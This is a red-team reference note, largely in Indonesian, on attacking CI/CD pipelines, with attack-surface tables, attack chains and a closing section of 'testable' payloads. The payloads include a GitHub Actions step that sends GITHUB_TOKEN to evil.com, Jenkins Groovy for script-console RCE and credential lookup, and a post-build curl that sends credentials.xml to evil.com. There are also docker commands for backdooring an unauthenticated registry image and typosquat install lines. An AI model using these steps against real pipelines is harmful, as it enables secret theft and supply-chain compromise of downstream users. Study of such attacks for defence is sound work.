---
title: Attack Perspective — DevOps/CI/CD (Red Team Pipeline)
tags:
- attack
- red-team
- devops
- ci-cd
- github-actions
- jenkins
- artifact
- supply-chain
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# DevOps/CI/CD — Perspektif Penyerang (Pipeline Poison)

> CI/CD = supply chain choke point. Satu pipeline compromise → semua artifact terinfeksi → semua consumer kena. Red team: runner compromise, token theft, pipeline injection, artifact tamper.

## 1. Attack Surface CI/CD

| Komponen | Vektor | MITRE ID | Tool / CVE | Evasion | Detection Gap |
|----------|--------|----------|------------|---------|----------------|
| **GitHub Actions** | Runner compromise, GITHUB_TOKEN theft, workflow inject | T1195.002 | PR trigger, action dependency | Runner = ephemeral | Secret audit = delayed |
| **GitLab CI** | Runner hijack, variable leak | T1195.002 | Shared runner abuse | Multi-tenant = legit | GitLab audit = delayed |
| **Jenkins** | Script console RCE, plugin vuln | T1195.002 | CVE-2024-23897 path traversal | Script console = admin | Jenkins audit = rare |
| **Artifact Repo** | Artifact swap, tag hijack | T1195.002 | Nexus/Artifactory admin | Repo = trust store | Repo audit = rare |
| **Terraform** | State file theft → secrets | T1530 | S3 backend plaintext | State = plaintext | Terraform audit = rare |
| **Container Registry** | Malicious image, tag confusion | T1195.002 | Docker Hub spoof | Image = valid tag | Image scan = post-deploy |
| **Secrets Store** | Vault/Secret Manager compromise | T1552 | API token theft | Secret = legit access | Vault audit = rare |

## 2. CI/CD Attack Chain

```
Recon: CI/CD platform → repo → workflow → runner
    ↓
Initial Access:
  ├── Pull Request → trigger workflow (if untrusted)
  ├── Fork → PR → workflow trigger → runner access
  ├── Stolen developer token → push → trigger
  └→ Compromised Action dependency → supply chain
    ↓
Secret Theft:
  ├── GITHUB_TOKEN → repo access → push code
  ├── Cloud creds (AWS_ACCESS_KEY_ID) → cloud access
  ├── Signing key → sign malicious artifact
  └→ Registry token → publish malicious package
    ↓
Artifact Poison:
  ├── Inject code ke build → artifact infected
  ├── Swap base image → backdoor all layer
  ├── Modify package → backdoor downstream
  └→ Terraform state → malicious infra
    ↓
Persistence:
  ├── Cron action → periodic re-trigger
  ├── Backdoor Action → perpetual compromise
  └→ Webhook → trigger on every push
    ↓
Impact: SolarWinds pattern — semua downstream = compromised
```

## 3. GitHub Actions Secret Exfil

```
Recon: .github/workflows/*.yml → job, env, secret usage
    ↓
Trigger: Pull request (pull_request_target) → workflow runs
    ↓
Exfil:
  ├── Step: printenv → env (secrets) → log (delete PR after)
  ├── Step: curl $SECRET → attacker server
  └→ Modified action (fork) → access secrets
    ↓
Evasion: Delete PR → no trace (if admin not fast)
```

## 4. CVE & Kasus

| Kasus | Impact | Teknik |
|-------|--------|--------|
| CVE-2024-23897 (Jenkins) | RCE → credential store | CLI path traversal |
| CVE-2024-27198 (TeamCity) | Pre-auth RCE → full CI/CD | Artifact poison |
| Codecov 2021 | CI credential theft | Modified bash uploader |
| SolarWinds | Global supply chain | Build server compromise |

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Gitleaks / TruffleHog** | Secret scan (workflow file) |
| **Semgrep** | CI/CD misconfig analysis |
| **actionlint** | GitHub Actions linter |
| **terraform-plan** | State secret extraction |
| **Custom workflow** | Secret env dump payload |

## 6. Referensi
- GitHub Actions Security — https://docs.github.com/en/actions/security-guides
- Jenkins CVE-2024-23897 — https://www.jenkins.io/security/advisory/2024-01-24/
- SLSA — https://slsa.dev/
- CI/CD Framework — https://www.legitsecurity.com/

## Konkret — CI/CD Exploit Payload (Testable)

### GitHub Actions — token theft

```yaml
# 1. Malicious action di workflow (third-party untrusted)
# .github/workflows/deploy.yml
steps:
  - name: Build
    run: |
      # Instal dependency berbahaya → exfil GITHUB_TOKEN
      echo "$GITHUB_TOKEN" | base64 > /tmp/t.txt
      curl -X POST https://evil.com/exfil -d @/tmp/t.txt

# 2. Pull request trigger → PR dari fork
# GITHUB_TOKEN punya write → injeksi ke main branch
on: pull_request_target
# PERINGATAN: PR target runs dengan full token!
```

### Jenkins — Credential Thief

```bash
# 1. Jenkins Script Console (admin) → RCE
groovy:
def proc = "id".execute()
println proc.text

# 2. Read credentials (if user punya access)
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance, null, null)

# 3. Job config modify → inject step
# Post-build action:
sh 'curl -X POST https://evil.com/exfil -d @/var/lib/jenkins/credentials.xml'
```

### Docker Registry — Image Backdoor

```bash
# 1. Registry exposed (port 5000) → API tanpa auth
curl http://registry:5000/v2/_catalog
# 2. Pull image
docker pull localhost:5000/app:latest
# 3. Inject backdoor
docker run -it localhost:5000/app:latest sh
# tambah shell ke image
docker commit <container> localhost:5000/app:backdoor
docker push localhost:5000/app:backdoor
# 4. Deploy job pull backdoor → all future deployments compromised
```

### Artifact Poisoning (Dependency)

```bash
# 1. Dependabot / package registry mirror
# Typosquat: nama package mirip (loug4j vs log4j)
npm install log4js-evil  # tapi package asli: log4js
# 2. Publish malicious package ke public registry (npm/pypi)
pip install requests-evil  # typosquat dari requests
# 3. Supply chain RCE di CI runner
```

### Checklist CI/CD

1. GitHub Actions — check third-party actions, pull_request_target
2. Jenkins — script console, credential store post-build
3. Registry — unauth push/pull
4. Env var — SECRETS di job logs/artifacts
5. Supply chain — dependency lock file audit
---

audited
---
